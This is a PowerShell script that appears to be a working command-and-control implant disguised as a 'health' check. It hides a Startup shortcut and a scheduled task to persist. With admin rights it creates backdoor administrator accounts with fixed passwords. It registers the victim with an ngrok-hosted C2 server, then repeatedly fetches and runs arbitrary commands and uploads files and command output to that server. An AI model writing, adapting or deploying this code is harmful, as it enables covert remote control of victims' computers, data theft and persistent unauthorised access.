# Register into C2: Complete
# Remember name: Complete
# Poll c2 for tasks under name remembered.: Complete
# Check if admin, if admin create scheduled task for script for persistance, make new admin user, hide file in system32

#Register new agent
$IpV4 = (Test-Connection -ComputerName (hostname) -Count 1 | Select-Object -ExpandProperty IPV4Address).IPAddressToString
$Hostname = $env:COMPUTERNAME
$user = Invoke-Expression -Command "whoami" 2>&1

$c2="https://promptly-kind-anchovy.ngrok-free.app"



$ScriptPath = [System.IO.Path]::Combine($env:LOCALAPPDATA, "health.ps1")
$ShortcutPath = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup\health.lnk")
Copy-Item "$env:TEMP\health.ps1" -Destination $ScriptPath

$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-WindowStyle Hidden -Command `"Start-Process -FilePath 'powershell.exe' -ArgumentList '-ExecutionPolicy Bypass -File $ScriptPath' -WindowStyle Hidden -PassThru`""
$Shortcut.Save()

$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
$isAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if($isAdmin) {
    Invoke-Expression -Command "net user EggsBenedict32867 Password123! /add"  2>&1
    Invoke-Expression -Command "net localgroup Administrators EggsBenedict32867 /add"  2>&1
    Invoke-Expression -Command "net localgroup Administrators DefaultAccount /add"  2>&1
    Invoke-Expression -Command "$newpassword = ConvertTo-SecureString 'test123' -AsPlainText -Force" 2>&1
    Invoke-Expression -Command "Set-LocalUser -Name DefaultAccount -Password $newpassword" 2>&1
    Invoke-Expression -Command "net user DefaultAccount /active:yes" 2>&1
    $task_dest="C:\Program Files\WindowsPowerShell\Modules\health.ps1"
    Copy-Item "$env:TEMP\health.ps1" -Destination $task_dest
    $action = New-ScheduledTaskAction -Execute "$task_dest\health.ps1"
    $Principal = New-ScheduledTaskPrincipal -UserId "Administrator" -LogonType ServiceAccount -RunLevel Highest
    $trigger = New-ScheduledTaskTrigger -AtLogon
    $settings = New-ScheduledTaskSettingsSet
    $task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings
    Register-ScheduledTask WindowsHealthCheck -InputObject $task
    # $globalStartup="\Windows\System32\health.ps1"
    $ShortcutPath = "\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\health.lnk"
    Copy-Item "$env:TEMP\health.ps1" -Destination $globalStartup
    $WScriptShell = New-Object -ComObject WScript.Shell
    $Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
    $Shortcut.TargetPath = "powershell.exe"
    $Shortcut.Arguments = "-WindowStyle Hidden -Command `"Start-Process -FilePath 'powershell.exe' -ArgumentList '-ExecutionPolicy Bypass -File $task_dest' -WindowStyle Hidden -PassThru`""
    $Shortcut.Save()

    

}
$params = @{
 "name"=$Hostname;
 "ip"=$IpV4;
 "user"=$user
 "is_admin"=$isAdmin
}
Remove-Item "$env:TEMP\health.ps1"
Invoke-WebRequest -Uri $c2/register -Method POST -Body ($params|ConvertTo-Json) -ContentType "application/json"


while ($true) {
    $Hostname = $env:COMPUTERNAME
    $response = Invoke-WebRequest -Uri "$c2/task/$Hostname" -Method GET
    $content = $response.Content.Trim()

    # Split response into command and task ID
    $parts = $content -split "END", 2
    if ($parts.Count -eq 2) {
        $command = $parts[0]
        $task_id = $parts[1]

        

        # Check to see if we are requesting a download, if not move on normally.
        $check_download = $command -split " ", 2
        if ($check_download[0] -eq "download"){ 
            $b64 = [System.convert]::ToBase64String((Get-Content -Path $check_download[1] -Encoding Byte))
            $params = @{
                "data"  = $b64
                "name"  = $Hostname
            }
            Invoke-WebRequest -Uri "$c2/download" -Method POST  -Body ($params | ConvertTo-Json) -ContentType "application/json"
            $bytes = [System.Text.Encoding]::UTF8.GetBytes("Download Complete")
            $encodedString = [System.Convert]::ToBase64String($bytes)
            $params = @{
                    "task_id"  = $task_id
                    "results"  = $encodedString
                }

            Invoke-WebRequest -Uri "$c2/report" -Method POST -Body ($params | ConvertTo-Json) -ContentType "application/json"
        }
        else{
            # Execute command and capture result
            $result = Invoke-Expression -Command $command 2>&1 | Out-String
            if ($content -ne "No Command") { # Check if we got sent "No Command" initially.
                $bytes = [System.Text.Encoding]::UTF8.GetBytes($result)
                $encodedString = [System.Convert]::ToBase64String($bytes)

                $params = @{
                    "task_id"  = $task_id
                    "results"  = $encodedString
                }

                Invoke-WebRequest -Uri "$c2/report" -Method POST -Body ($params | ConvertTo-Json) -ContentType "application/json"
            }
        }
    }
    Start-Sleep -Seconds 120
}

